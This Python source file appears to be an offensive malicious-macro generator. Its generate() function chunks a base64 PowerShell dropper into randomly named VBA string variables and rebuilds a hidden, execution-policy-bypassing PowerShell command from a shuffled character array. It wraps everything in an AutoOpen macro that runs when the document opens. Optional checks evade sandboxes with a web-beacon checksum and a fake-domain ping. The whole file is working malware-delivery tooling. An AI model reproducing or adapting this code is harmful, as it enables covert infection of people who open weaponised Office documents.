import random
import os
import math

def generate(dropperbase64):
    utility_variables_list = ['powershell_var', 'final_deobf_destination', 'final_form', 'pschararray',
                              'webbeaconchecksum', 'webbeaconrequest', 'webbeaconurl', 'pingobj',
                              'networktest1', 'networktest2']

    payloadvariables = []
    utilityvariables = {}
    utilityvariablevalues = []

    # optional beacons
    sandboxbypasswebbeacon = 0  # set to 1 if you want to wrap the vba in a web beacon checksum test to defeat offline sandboxing / fakenet
    webbeaconchecksum = 9591

    pingbeacon = 1  # set to 1 if you want to ping the userdomain environment variable string and the domain in the pingurl variable below
    pingurl = 'location.microsoft.com'  # this should be a believable but nonexistent domain

    insertrandomblanklines = 1  # value of 3 means 1/3 chance for a blank new line to appear between vba chunk writes

    def decide_to_add_a_blankline():
        if random.randint(1, 2) == 1:
            return True
        else:
            return False

    def decide_how_many_blank_lines():
        return random.randint(1, 2)

    # two english words concatenated camelcase
    wordspath = os.path.join(os.path.split(__file__)[0], 'words.txt')
    with open(wordspath, 'r') as r:
        words = set(r.readlines())

    def getvar():
        trying = 1
        while trying:
            varattempt1 = str((random.sample(words, k=1)[0].rstrip("\n")))
            if varattempt1.isalpha():
                trying = 0
        trying = 1
        while trying:
            varattempt2 = str((random.sample(words, k=1)[0].rstrip("\n")))
            if varattempt2.isalpha():
                trying = 0
        return str(varattempt1 + "_" + varattempt2)

    remainingbase64 = dropperbase64
    chunkedbase64 = []
    process_creation_args = "powershell -windowstyle hidden -executionpolicy bypass -e "
    process_creation_args_characters = ''.join(set(process_creation_args))

    process_creation_args_characters_list = []
    for i in process_creation_args_characters:
        process_creation_args_characters_list.append(i)
    random.shuffle(process_creation_args_characters_list)

    while len(remainingbase64) > 0:
        thischunksize = random.randint(7, 21)
        if thischunksize > len(remainingbase64):
            thischunksize = len(remainingbase64)
        thischunk = remainingbase64[0:thischunksize]
        remainingbase64 = remainingbase64[thischunksize:]
        chunkedbase64.append(thischunk)

    while len(payloadvariables) < len(chunkedbase64):
        trying = 1
        while trying == 1:
            newvar = getvar()
            if not newvar in payloadvariables:
                payloadvariables.append(newvar)
                trying = 0

    for utilityvar in utility_variables_list:
        trying = 1
        while trying == 1:
            newvar = getvar()
            if not newvar in utilityvariablevalues:
                utilityvariablevalues.append(newvar)
                utilityvariables[utilityvar] = newvar
                trying = 0

    vba = ''

    # define the var that will eventually contain the executable and args
    vba += str("\t" + "Dim " + utilityvariables['powershell_var'] + " As String" + "\r\n")

    # build a vba array of the characters needed for the process_creation_args and add it to the vba
    vbpschararray = str(utilityvariables['pschararray'] + " = " + "Array(")
    for i in process_creation_args_characters_list:
        vbpschararray = vbpschararray + str('"' + i + '"' + ', ')
    vbpschararray = vbpschararray.rstrip(', ') + ')'
    vba += "\t" + vbpschararray + "\r\n"

    vbpsreassemblylist = []

    for char in process_creation_args:
        vbpsreassemblylist.append(str("\t" + utilityvariables['powershell_var'] +
                                      ' = ' + utilityvariables['powershell_var'] + " + " +
                                      utilityvariables['pschararray'] + "(" + str(
            process_creation_args_characters_list.index(char)) + ")") + "\r\n")

    frequencytoreassemblevbps = math.floor(len(chunkedbase64) / (len(vbpsreassemblylist) / 2)) - 1
    vbpsreassemblycounter = 0

    if len(chunkedbase64) == len(payloadvariables):
        counter = 0
        interspersed_count = 0
        interspersed_deobf = str(utilityvariables['final_deobf_destination'] + ' = ' + utilityvariables[
            'final_deobf_destination'] + ' & ')
        while counter < len(chunkedbase64):
            vba += "\t" + str("Dim " + payloadvariables[counter] + " As String" + "\r\n")
            vba += "\t" + (payloadvariables[counter] + ' = ' + '"' + chunkedbase64[counter] + '"' + "\r\n")
            if insertrandomblanklines == 1:
                if decide_to_add_a_blankline() == True:
                    vba += "\r\n" * decide_how_many_blank_lines()
            interspersed_count = interspersed_count + 1
            interspersed_deobf = interspersed_deobf + payloadvariables[counter] + ' & '
            if interspersed_count > 4 or (len(chunkedbase64) - counter) < 4:
                interspersed_deobf = str(interspersed_deobf.rstrip('& ') + "\r\n")
                vba += "\t" + interspersed_deobf
                interspersed_count = 0
                interspersed_deobf = str(utilityvariables['final_deobf_destination'] + ' = ' + utilityvariables[
                    'final_deobf_destination'] + ' & ')
            counter = counter + 1
            if vbpsreassemblycounter < frequencytoreassemblevbps and vbpsreassemblylist:
                vbpsreassemblycounter += 1
            elif vbpsreassemblycounter == frequencytoreassemblevbps and vbpsreassemblylist:
                thispop = vbpsreassemblylist.pop(0)
                # print(thispop)
                vba += thispop
                thispop = vbpsreassemblylist.pop(0)
                # print(thispop)
                vba += thispop
                vbpsreassemblycounter = 0
    deobf = ''
    vba += "\t" + str(utilityvariables['powershell_var']) + ' = ' + str(
        utilityvariables['powershell_var']) + " + " + str(utilityvariables['final_deobf_destination']) + "\r\n"
    vba += "\t" + 'Shell$ ' + str(utilityvariables['powershell_var']) + "\r\n"
    # wrap the vba
    if sandboxbypasswebbeacon == 1:
        webbeaconprepend = ''
        webbeaconprepend += str("Dim " + utilityvariables['webbeaconrequest'] + " As Object\r\n")
        webbeaconprepend += str("Set " + utilityvariables[
            'webbeaconrequest'] + " = CreateObject(\"WinHttp.WinHttpRequest.5.1\")\r\n")
        webbeaconprepend += str("Dim " + utilityvariables['webbeaconurl'] + " As String\r\n")
        webbeaconprepend += str(utilityvariables[
                                    'webbeaconurl'] + " = (\"http://finance.google.com/finance/info?client=ig&q=NASDAQ%3\")\r\n")
        webbeaconprepend += str(utilityvariables['webbeaconrequest'] + ".Open \"GET\", " + utilityvariables[
            'webbeaconurl'] + ", False\r\n")
        webbeaconprepend += str(utilityvariables['webbeaconrequest'] + ".send\r\n")
        webbeaconprepend += str(utilityvariables['webbeaconchecksum'] + " = 0\r\n")
        webbeaconprepend += str(
            "For a = 1 To Len(" + utilityvariables['webbeaconrequest'] + ".responsetext)\r\n")
        webbeaconprepend += str("\t" + utilityvariables['webbeaconchecksum'] + " = " + utilityvariables[
            'webbeaconchecksum'] + " + Asc(Mid(" + utilityvariables[
                                    'webbeaconrequest'] + ".responsetext, a, 1))\r\n")
        webbeaconprepend += str("Next\r\n")
        webbeaconprepend += str(
            "If " + utilityvariables['webbeaconchecksum'] + " = " + str(webbeaconchecksum) + " Then\r\n")
        vba = webbeaconprepend + vba
        vba += "End If\r\n"
    if pingbeacon == 1:
        pingvbaprepend = "On Error Resume Next\r\n"
        pingvbaprepend = pingvbaprepend + "\tSet " + utilityvariables[
            'pingobj'] + " = GetObject(\"winmgmts:\").Get(\"Win32_PingStatus.Address='" + pingurl + "',ResolveAddressNames=True\")\r\n"
        pingvbaprepend = pingvbaprepend + "\tWith " + utilityvariables['pingobj'] + "\r\n"
        pingvbaprepend = pingvbaprepend + "\t\tDebug.Print \"Status Code: \" & .StatusCode\r\n"
        pingvbaprepend = pingvbaprepend + "\t\tIf .StatusCode = 0 Then\r\n"
        pingvbaprepend = pingvbaprepend + "\t\t\t" + utilityvariables['networktest1'] + " = False\r\n"
        pingvbaprepend = pingvbaprepend + "\t\tElseIf .StatusCode > 0 Then\r\n"
        pingvbaprepend = pingvbaprepend + "\t\t\t" + utilityvariables['networktest1'] + " = False\r\n"
        pingvbaprepend = pingvbaprepend + "\t\tElse\r\n"
        pingvbaprepend = pingvbaprepend + "\t\t\t" + utilityvariables['networktest1'] + " = True\r\n"
        pingvbaprepend = pingvbaprepend + "\t\tEnd If\r\n"
        pingvbaprepend = pingvbaprepend + "\tEnd With\r\n"
        pingvbaprepend = pingvbaprepend + "\t\r\n"
        pingvbaprepend = pingvbaprepend + "\tIf Environ$(\"userdomain\") = LCase(Environ$(\"computername\")) Then\r\n"
        pingvbaprepend = pingvbaprepend + "\t\t" + utilityvariables['networktest2'] + " = False\r\n"
        pingvbaprepend = pingvbaprepend + "\tElse\r\n"
        pingvbaprepend = pingvbaprepend + "\t\t" + utilityvariables['networktest2'] + " = True\r\n"
        pingvbaprepend = pingvbaprepend + "\tEnd If\r\n"
        pingvbaprepend = pingvbaprepend + "\t\r\n"
        pingvbaprepend = pingvbaprepend + "\tIf " + utilityvariables['networktest1'] + " = True And " + \
                         utilityvariables['networktest2'] + " = True Then\r\n"
        vba = pingvbaprepend + vba
        vba = vba + "\tEnd If\r\n"

    vba = "Sub AutoOpen()\r\n" + vba + "End Sub"

    return vba